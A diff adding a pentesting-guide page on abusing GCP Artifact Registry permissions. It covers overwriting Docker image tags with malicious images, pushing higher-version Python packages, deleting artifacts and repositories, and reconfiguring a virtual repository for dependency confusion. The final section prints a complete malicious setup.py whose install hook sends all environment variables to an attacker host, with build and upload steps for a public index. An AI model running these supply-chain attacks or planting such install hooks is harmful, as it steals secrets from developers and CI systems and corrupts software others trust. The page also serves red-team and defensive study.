@@ -1,0 +1,278 @@
+# GCP - Artifact Registry Privesc
+
+## Artifact Registry
+
+For more information about Artifact Registry check:
+
+### artifactregistry.repositories.uploadArtifacts
+
+With this permission an attacker could upload new versions of the artifacts with malicious code like Docker images:
+
+<details>
+<summary>Upload Docker image to Artifact Registry</summary>
+
+```bash
+# Configure docker to use gcloud to authenticate with Artifact Registry
+gcloud auth configure-docker <location>-docker.pkg.dev
+
+# tag the image to upload it
+docker tag <local-img-name>:<local-tag> <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
+
+# Upload it
+docker push <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
+```
+
+</details>
+
+> [!CAUTION]
+> It was checked that it's **possible to upload a new malicious docker** image with the same name and tag as the one already present, so the **old one will lose the tag** and next time that image with that tag is **downloaded the malicious one** will be downloaded.
+
+<details>
+
+<summary>Upload a Python library</summary>
+
+**Start by creating the library to upload** (if you can download the latest version from the registry you can avoid this step):
+
+1.  **Set up your project structure**:
+
+    - Create a new directory for your library, e.g., `hello_world_library`.
+    - Inside this directory, create another directory with your package name, e.g., `hello_world`.
+    - Inside your package directory, create an `__init__.py` file. This file can be empty or can contain initializations for your package.
+
+    <details>
+    <summary>Create project structure</summary>
+
+    ```bash
+    mkdir hello_world_library
+    cd hello_world_library
+    mkdir hello_world
+    touch hello_world/__init__.py
+    ```
+
+    </details>
+
+2.  **Write your library code**:
+
+    - Inside the `hello_world` directory, create a new Python file for your module, e.g., `greet.py`.
+    - Write your "Hello, World!" function:
+
+    <details>
+    <summary>Create library module</summary>
+
+    ```python
+    # hello_world/greet.py
+    def say_hello():
+        return "Hello, World!"
+    ```
+
+    </details>
+
+3.  **Create a `setup.py` file**:
+
+    - In the root of your `hello_world_library` directory, create a `setup.py` file.
+    - This file contains metadata about your library and tells Python how to install it.
+
+    <details>
+    <summary>Create setup.py file</summary>
+
+    ```python
+    # setup.py
+    from setuptools import setup, find_packages
+
+    setup(
+        name='hello_world',
+        version='0.1',
+        packages=find_packages(),
+        install_requires=[
+            # Any dependencies your library needs
+        ],
+    )
+    ```
+
+    </details>
+
+**Now, lets upload the library:**
+
+1.  **Build your package**:
+
+    - From the root of your `hello_world_library` directory, run:
+
+    <details>
+    <summary>Build Python package</summary>
+
+    ```sh
+    python3 setup.py sdist bdist_wheel
+    ```
+
+    </details>
+
+2.  **Configure authentication for twine** (used to upload your package):
+    - Ensure you have `twine` installed (`pip install twine`).
+    - Use `gcloud` to configure credentials:
+
+<details>
+<summary>Upload package with twine</summary>
+
+```sh
+twine upload --username 'oauth2accesstoken' --password "$(gcloud auth print-access-token)" --repository-url https://<location>-python.pkg.dev/<project-id>/<repo-name>/ dist/*
+```
+
+</details>
+
+3. **Clean the build**
+
+<details>
+<summary>Clean build artifacts</summary>
+
+```bash
+rm -rf dist build hello_world.egg-info
+```
+
+</details>
+
+</details>
+
+> [!CAUTION]
+> It's not possible to upload a python library with the same version as the one already present, but it's possible to upload **greater versions** (or add an extra **`.0` at the end** of the version if that works -not in python though-), or to **delete the last version an upload a new one with** (needed `artifactregistry.versions.delete)`**:**
+>
+> <details>
+> <summary>Delete artifact version</summary>
+>
+> ```sh
+> gcloud artifacts versions delete <version> --repository=<repo-name> --location=<location> --package=<lib-name>
+> ```
+>
+> </details>
+
+### `artifactregistry.repositories.downloadArtifacts`
+
+With this permission you can **download artifacts** and search for **sensitive information** and **vulnerabilities**.
+
+Download a **Docker** image:
+
+<details>
+<summary>Download Docker image from Artifact Registry</summary>
+
+```sh
+# Configure docker to use gcloud to authenticate with Artifact Registry
+gcloud auth configure-docker <location>-docker.pkg.dev
+
+# Dowload image
+docker pull <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
+```
+
+</details>
+
+Download a **python** library:
+
+<details>
+<summary>Download Python library from Artifact Registry</summary>
+
+```bash
+pip install <lib-name> --index-url "https://oauth2accesstoken:$(gcloud auth print-access-token)@<location>-python.pkg.dev/<project-id>/<repo-name>/simple/" --trusted-host <location>-python.pkg.dev --no-cache-dir
+```
+
+</details>
+
+- What happens if a remote and a standard registries are mixed in a virtual one and a package exists in both? Check this page:
+
+### `artifactregistry.tags.delete`, `artifactregistry.versions.delete`, `artifactregistry.packages.delete`, (`artifactregistry.repositories.get`, `artifactregistry.tags.get`, `artifactregistry.tags.list`)
+
+Delete artifacts from the registry, like docker images:
+
+<details>
+<summary>Delete Docker image from Artifact Registry</summary>
+
+```bash
+# Delete a docker image
+gcloud artifacts docker images delete <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
+```
+
+</details>
+
+### `artifactregistry.repositories.delete`
+
+Detele a full repository (even if it has content):
+
+<details>
+<summary>Delete Artifact Registry repository</summary>
+
+```
+gcloud artifacts repositories delete <repo-name> --location=<location>
+```
+
+</details>
+
+### `artifactregistry.repositories.setIamPolicy`
+
+An attacker with this permission could give himself permissions to perform some of the previously mentioned repository attacks.
+
+### Pivoting to other Services through Artifact Registry Read & Write
+
+- **Cloud Functions**
+
+When a Cloud Function is created a new docker image is pushed to the Artifact Registry of the project. I tried to modify the image with a new one, and even delete the current image (and the `cache` image) and nothing changed, the cloud function continue working. Therefore, maybe it **might be possible to abuse a Race Condition attack** like with the bucket to change the docker container that will be run but **just modifying the stored image isn't possible to compromise the Cloud Function**.
+
+- **App Engine**
+
+Even though App Engine creates docker images inside Artifact Registry. It was tested that **even if you modify the image inside this service** and removes the App Engine instance (so a new one is deployed) the **code executed doesn't change**.\
+It might be possible that performing a **Race Condition attack like with the buckets it might be possible to overwrite the executed code**, but this wasn't tested.
+
+### `artifactregistry.repositories.update`
+An attacker does not need specific Artifact Registry permissions to exploit this issue—only a vulnerable virtual-repository configuration. This occurs when a virtual repository combines a remote public repository (e.g., PyPI, npm) with an internal one, and the remote source has equal or higher priority. If both contain a package with the same name, the system selects the highest version. The attacker only needs to know the internal package name and be able to publish packages to the corresponding public registry.
+
+With the `artifactregistry.repositories.update` permission, an attacker could change a virtual repository’s upstream settings to intentionally create this vulnerable setup and use Dependency Confusion as a persistence method by inserting malicious packages that developers or CI/CD systems may install automatically.
+
+The attacker creates a malicious version of the internal package in the public repository with a higher version number. For Python packages, this means preparing a package structure that mimics the legitimate one.
+
+```bash
+mkdir /tmp/malicious_package
+cd /tmp/malicious_package
+PACKAGE_NAME="<package-name>"
+mkdir "$PACKAGE_NAME"
+touch "$PACKAGE_NAME/__init__.py"
+```
+
+A setup.py file is then created containing malicious code that would run during installation. This file must specify a version number higher than the one in the private repository.
+
+```bash
+cat > setup.py << 'EOF'
+import setuptools
+from setuptools.command.install import install
+import os
+import urllib.request
+import urllib.parse
+
+def malicious_function():
+    data = dict(os.environ)
+    encoded_data = urllib.parse.urlencode(data).encode()
+    url = 'https://<ip-atacante>/exfil'
+    req = urllib.request.Request(url, data=encoded_data)
+    urllib.request.urlopen(req)
+
+class AfterInstall(install):
+    def run(self):
+        install.run(self)
+        malicious_function()
+
+setuptools.setup(
+    name = "<package-name>",
+    version = "0.1.1",
+    packages = ["<package-name>"],
+    cmdclass={'install': AfterInstall},
+)
+EOF
+```
+Build the package and delete the wheel to ensure the code is executed during installation.
+```bash
+python3 setup.py sdist bdist_wheel
+rm dist/<package-name>*.whl
+```
+
+Upload the malicious package to the public repository (for example, test.pypi.org for Python).
+```bash
+pip install twine
+twine upload --repository testpypi dist/*
+```
+
+When a system or service installs the package using the virtual repository, it will download the malicious version from the public repository instead of the legitimate internal one, because the malicious version is higher and the remote repository has equal or higher priority.
